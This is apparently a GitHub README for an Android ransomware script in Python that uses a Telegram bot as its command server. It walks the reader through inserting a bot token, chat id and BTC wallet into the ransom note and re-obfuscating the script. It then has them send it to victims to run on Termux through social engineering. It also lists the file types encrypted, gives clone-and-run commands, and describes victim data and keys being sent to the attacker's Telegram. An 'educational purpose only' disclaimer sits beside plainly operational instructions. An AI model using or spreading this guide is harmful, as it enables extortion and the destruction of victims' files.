# Android-Telegram-ransomware



  Android-Telegram-ransomware is an android shell ransomware type which uses telegram as CnC server

  


  Firstly de-obfuscate the variable encrypted script


  Then in line 47 you can change the directory to the android directory or you can leave it by default

  In line 29 and 30 of the script input your telegram bot token and chat id

  In line 63 to 81 you can add more extension for this ransomware to encrypt or leave it like that 
   

  In line 213 and 217 read those ransom note instruction carefully and replace @Walletaddress, @Emailaddress and @Chatid to your BTC Wallet address,
  Email address and Telegram Chat id respectively

 
  


  This is a shell type of android ransomware written in python not a self executable type in app extension

 
  Be careful when running it on your shell

  Currently it can encrypt that ends with '.txt', '.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.gif', '.pdf', '.doc', '.zip', '.db', '.bin', '.srt', '.js', '.java', '.html', '.php', '.docx', '.json', '.xml', '.csv', '.yml', '.yaml', '.tar', '.tgz', '.7z', '.rar', '.bak', '.bz2', '.go', '.bf', '.coffee', '.asp', '.aspx', '.js', '.jsp', '.css', '.mdb', '.sql', '.dbf', '.iso', '.odt', '.odp', '.ods', '.rtf', '.tex', '.epub', '.md', '.xls', '.xlsx', '.ppt', '.pptx', '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', '.bmp', '.svg', '.psd', '.raw' extension


  You can re-obfuscate the malware back and rename the script 
  and send the script to your victim to run on his termux using social engineering trick


  Once any of your victim android device has been infected with this ransomware a new notification will be sent to your telegram through your bot

  The notification will include your victim system info, date and time it was encrypted, zombie id, Encryption and Decryption key which you will give your 
  victim once he has make the payment


  This ransomware generate random encryption key for each system it encrypt
  
  
  
# Command


 git clone https://github.com/Gbolahanomostosho/Android-telegram-ransomware





 cd Android-telegram-ransomware




 pip install -r requirements.txt




 python Android-telegram-ransomware.py




# Diclaimer: 


  
  I wont be responsible for any misuse uses of this tool.......
 

  Do not use this tool to attack victim device without their consent.......
 

  For educational purpose only......
  
  
  


  
  Self executable android ransomware with .apk extension purely written in python and java 

  Which use telegram server as CnC coming soon !!!!!

 
